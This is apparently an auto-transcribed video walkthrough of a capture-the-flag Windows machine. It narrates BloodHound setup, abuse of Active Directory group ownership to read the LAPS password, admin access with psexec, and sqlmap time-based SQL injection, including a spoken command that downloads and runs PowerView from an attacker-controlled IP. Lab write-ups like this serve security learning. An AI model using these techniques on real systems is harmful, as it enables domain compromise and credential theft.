bloodhound and let's see is this the right thing i don't think so uh bloodhound let's just download it so i'm going to do sudo neo4j console to start neo4j and then github bloodhound go to google and go to releases and yeah this was updated like last month so let's do not arm not darwin linux x64 there it is wget unzip bloodhound linux and then we just execute bloodhound linux bloodhound and it's going to oh neo4j version too low that's new um let's exit so it's stopping near 4j sudo apt install neo4j maybe i should have done an update first we'll see so it's unpacking 421 i wish i saw what version it wanted run that run this no database found maybe it wasn't started by the time i started so just erase the j so login prompt came up and neo4j version still too old so i'm going to run an app update then install again to see if i get a newer version 0 app update and shoot i have an issue with my apt command so i'm probably going to pause the video fix this whatever's wrong and then we will resume because it's been so long since i updated my parrot box it looks like the public key is wrong so it can't verify the packages on parrot so yeah sorry about that sloppy edit but i found the issue um i just had to mainly import the key so this error message right here is telling me i don't have this public key so i ran this command the sudo apt-key advanced key server to receive the key and then my app started working again so now i can do app update and we can say apt install neo4j and it's already at the newest version that sucks and bloodhound wants like neo4j4 right let's do neo4j console and bloodhound let's see capital b like this wants to log in and it won't yeah it wants 4.4 and i'm at 4.2 so let's google neo4j d package and we will manually install this if we have to let's see near 4j.com is there downloads oh come on download linux this may be another i have to pause the video and get this working i regret now updating my bloodhound uh here we go we got a tar so uh we'll just copy this what if we want community neo4j repositories if we do this paste it sudo apt install neo 4j xeto app update let's see neo4j daemon but is not installable unmet so can we remove neo4j probably not because we have other packages that depend on this bloodhound and neo4j will be removed that's fine because we're using bloodhound locally depends i don't know what that package is that damon see we ran those commands and it still did not work okay so i wonder if we just go to the tar and mainly run this see copy link wget i need to put this in quotes see let's just curl near 4j.tar dot what was it i don't even know click it there we go we can move that mv downloads and then tar zx xvf i think z because it's a gz neo4j okay cd bin neo4j console i think we are good um i'm just closing out the old neo4j start the new one and then we want to go to let's see bloodhound.pie invalid username and password so i think we now want to log in and change the password because neo4j forces you to change it upon first login don't worry guys we are getting there i think database username password this looks different neo4j neo4j new password neo4j um i'm gonna put password then that looks good okay neo4j password login and finally we are in bloodhound that that was an ordeal oh god i don't want to do that again so we want to go to places we're going to go hdb then stream i o blown home pie and here's the collection that we had made so we drag and drop it and hope everything works which it looks like it is so we can x out of that and if we do queries analysis we do find all domain admins and it looks like it is working so let's see is there a find fastest path shortest path from let's go own principles and we'll mark them as owned so j d god we own so we can go to him and mark user as owned then the other one who was that first user we were um let's see do we have a shell still yoshi hide yoshi hide making more cameras owned where is it i need to start my vpn back up i realize i stopped it when i was doing the apt and stuff and we have this neck 37 guy as owned so mark has earned where is it there it is so shortest path from own principles and we'll start with the last credential we got and we have something so jd god has right owner over top of core staff which can read the local administration password of the dc so let's see if we right click on this do help it tells us how we can abuse it right so let's see then set domain object so okay we're going to get evilwinrm back and we can probably do jd god's credentials so cat pw dot text evil winner m jd god with two d's and here's the password so establishing winrm jd godd that was the user right j d g o d d c looks like he doesn't have winram so let's see the other one was nick 37 i think with two k's and we use this password i believe see if we log in we do so it looks like uh the jd god user doesn't have when rm rights but it doesn't matter because we have his credentials and we could also do analysis find shortest from owned and try the other users we have just can ps remote and this one doesn't have anything so since we are remoted in we can just abuse or win or m session and then switch credentials to jd god to do these things so pretty much just going to follow what the steps were here if you go to abuse info so let's now um we probably have to run power view first honestly so let's see up power i thought i had powersport dev get branch this is dev okay so that's what i want and it's under recon cp power view hdb stream www okay the first step is we have to load um powersploit so i'm going to do iex then invoke web request and we can do http 1010 14 8 powerview.ps1 and then use basic parsing i think is the string like that did that work it's thinking i think three is my pain we see it successfully got it so i think we have loaded power view so let's create the credential object so we'll do pwd or i'll call it yeah we'll do pwd is equal to convert to secure string and then we need to get his password it's pw.text here's this password put this and then as plain text dash force so now his password is in the secure string so we can do cred for the credential object and then new object system management automation ps credential stream io dot hdb the whole domain and then jd i don't know if we need the domain because we're on the domain controller it's just habit and then pwd that's a horrible name for that by the way because it's like print working directory right if we look at cred we have that so now we can try set domain object owner identity and let's see he has right owner over core staff so core staff dash owner identity and let's set owner identity if we do our user next 37 and we want to specify our credential owner ident if i can spell it correctly a constraint validation occurred can i only add myself jd god that's weird okay it works when i do that um net user local group core staff see net group core staff oh wait i was just sending the owner here i wasn't adding anyone to the group so um the next one is add domain object acl target identity core staff principal identity jd god cred i cannot spell target identity to save my life there we go and let's see abuse domain object owner object acl okay now we can add domain group owner so add domain group member identity core staff dash members and this time i'm going to add nick 37 cred cred okay and the reason why i specified it this is because the next command i run um is not part of power view and does not have this dash cred thing so if i do get 80 computer and i think it's just dc right who am i host name yep get 80 computer dc dash property i would say it's ms-msc dash adm pwd let's see get 80 computer dash properties stir pwd last set mcs expiration and bad i wonder if i have to log in again to get a new token right so let's do get 80 computer dc dash properties start look at pwd last set expiration bad net group core staff i am a member of it and any member of core staff should be able to read lap's password i guess we could have used the get domain object like bloodhound saying um it's weird i should be able to just do dash property ms-mcs-adm-pwd but i can't it's not m like it's not that it's mcs that is bizarre um let's load power view again so http 10 10 14 8 um power view dot ps1 use basic parsing that's good and let's just copy what bloodhelm says we shouldn't need the dash cred because we're just using a current token so windows 1 this is just dc and then dash properties like that so we got it i'm not sure why it's not pulling it otherwise but i think this should authenticate us as administrator so let's do cme smb 101011.158 dash u administrator dash p put this in because lapse is always the administrator account and we can see pwned so we have finally finished this machine so ps exec administrator at 10 10 um 11 158 paste and we can just now go to the desktop because we are systems so cd users administrator desktop dir um root.x has to be somewhere right is there a different user uh maybe martin martin desktop there it is so that is that um there's two things i wanted to try out so first i want to go all the way back to this sql shell where is it i think reset here so stty so i want to get a shell again just as that basic user right so con ps1 yep if i go back to burp suite and we do eight probably this we get our shell here and what i want to do is we did the sql command right i want to try to reuse this and see if db admin can do xp command shell right so i want to say dirt tree like this c colon what does this look like um like this invalid parameter okay so let's just go to the ms sql cheat sheet i'm going to run all these commands one at a time see show advanced options unexpected argument oh god it's the attack of the unicode there we go or maybe not sqlcmd it's gonna go back here so it's all in one line so i want to q doesn't work with this well i'm sure someone's tried running this command before through sql command so i'm just going to copy this we'll go to google and google this and this looks like another cheat sheet show advanced oh wait what was it here it is so maybe if i copy this let's get rid nine zero single quote dash q okay so um my tty is kind of screwed up because when i re-got this shell um i got the show when it was in this mode so my sdty is small that's why you see it only taking up a little bit of the screen that being said when we run this command we are getting permission errors so even db admin doesn't have permission to the master database which would have granted us the ability to do this and i wanted to enable xpcmd shell because if i did then i would get a shell as the nt service account with scp impersonate which could probably use rogue potato to privesque as a unintended path but since db admin can't um nothing can be gained here right so there's one last thing i wanted to show on this box and that was the login form was actually injectable so this is another way you could do it it takes a long time because the way this is injectable isn't injectable in the normal way it's injectable in stacked queries through a time-based boolean loop so it's very slow to extract information however because this one or this field runs as db admin you can just extract the stream steam io backup directly from this database so i believe let's see copy to file stream io login.request if i do sql map dasher login dash request um force dash ssl like that if you don't oh because already ran it before we can see it returned user name stacked queries so if i do dump and then stream io underscore back is it back up or back i think it's backup right let's see we should have it in repeater dump table i guess right here now this one user um i should i did batch let's just do yes i'm guessing it is working we got the first character but it takes two seconds per query um i was going to go back here to just double check it was db underscore name i want to say it was five stream i o sex stream io backup yep so i'm just gonna let this run and we're gonna see if we get information out of it so we have now extracted just the name dbo movies and that took uh roughly two minutes to do so you can imagine how long it's going to take to um dump the entire movie's database and it's gonna now go slower because it's increasing the time to three seconds so um actually fetching for database stream io we're not even in the right database so let's go back and i think we want to specify dash capital d to specify that and we could probably do dash dash table users um let's see ambiguous option maybe tables users so there we go um now it's dumping for the database stream io backup but like i said this just takes forever to run so um you could have left this going like overnight potentially and got it so yeah i mean since we're now extracting information from um the stream io backup database i have confirmed this would be a valid way uh maybe not zero so maybe this user actually does not have it how is this working um now i'm confused so let's go that's seven where do i have a web shell evil winner m c slash i'm guessing it's under inetpub yep cd stream io.htb type login.php um db underscore oh never mind this i did not expect um this database to also be dbuser so um both the watch and stream io database are the same exact user so you don't really get anything by that sql map it's not until you go into admin that the database actually changes to uh db admin so um sorry for the confusing end but i just like showing the types of things i do after the box and i guess we learned together so hope you guys enjoy the video take care and i will see you all next week